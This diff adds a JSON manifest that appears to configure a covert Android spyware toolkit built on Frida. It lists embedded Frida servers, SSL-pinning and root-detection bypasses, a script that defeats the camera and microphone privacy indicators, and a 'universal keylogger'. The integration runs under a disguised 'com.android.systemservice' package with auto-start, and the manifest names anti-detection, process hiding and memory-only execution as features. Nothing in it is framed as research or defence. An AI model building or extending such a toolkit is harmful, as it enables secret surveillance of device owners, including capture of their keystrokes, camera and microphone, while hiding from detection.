@@ -1,0 +1,74 @@
+{
+  "frida_version": "16.1.4",
+  "generated_timestamp": "2025-01-13T14:07:00Z",
+  "architectures": [
+    "arm64-v8a",
+    "armeabi-v7a", 
+    "x86_64",
+    "x86"
+  ],
+  "servers": {
+    "arm64-v8a": {
+      "filename": "frida-server-arm64-v8a.b64",
+      "metadata": "frida-server-arm64-v8a.json",
+      "description": "Frida server for ARM64 devices (most modern Android devices)"
+    },
+    "armeabi-v7a": {
+      "filename": "frida-server-armeabi-v7a.b64",
+      "metadata": "frida-server-armeabi-v7a.json",
+      "description": "Frida server for ARM32 devices (older Android devices)"
+    },
+    "x86_64": {
+      "filename": "frida-server-x86_64.b64",
+      "metadata": "frida-server-x86_64.json",
+      "description": "Frida server for x86_64 emulators and Intel-based devices"
+    },
+    "x86": {
+      "filename": "frida-server-x86.b64",
+      "metadata": "frida-server-x86.json", 
+      "description": "Frida server for x86 emulators and Intel-based devices"
+    }
+  },
+  "scripts": {
+    "basic_hooks.js": {
+      "description": "Basic Android application hooks for Activity monitoring and System.exit blocking",
+      "categories": ["monitoring", "basic"]
+    },
+    "ssl_bypass.js": {
+      "description": "SSL/TLS certificate pinning bypass for various HTTP clients",
+      "categories": ["network", "bypass"]
+    },
+    "root_bypass.js": {
+      "description": "Root detection bypass for common root detection methods",
+      "categories": ["evasion", "bypass"]
+    },
+    "privacy_bypass.js": {
+      "description": "Privacy indicator bypass for Android 12+ camera and microphone indicators",
+      "categories": ["surveillance", "bypass", "privacy"]
+    },
+    "keylogger.js": {
+      "description": "Universal keylogger for capturing input events and text changes",
+      "categories": ["surveillance", "keylogging"]
+    }
+  },
+  "integration": {
+    "service_class": "com.android.systemservice.frida.FridaIntegrationService",
+    "multi_handler_class": "com.android.systemservice.frida.FridaMultiHandler",
+    "script_manager_class": "com.android.systemservice.frida.FridaScriptManager",
+    "default_port": 27042,
+    "max_sessions": 10,
+    "auto_start": true
+  },
+  "security": {
+    "encryption": "AES-256-GCM",
+    "obfuscation": "ProGuard + Custom Rules",
+    "anti_detection": ["Anti-Frida", "Anti-Xposed", "Process-Hiding"],
+    "stealth_features": ["Binary-Packing", "Runtime-Decryption", "Memory-Only-Execution"]
+  },
+  "compatibility": {
+    "android_versions": ["12", "13", "14", "15", "16"],
+    "api_levels": [31, 32, 33, 34, 35, 36],
+    "tested_devices": ["Samsung", "Google Pixel", "OnePlus", "Xiaomi", "Huawei"],
+    "emulator_support": true
+  }
+}
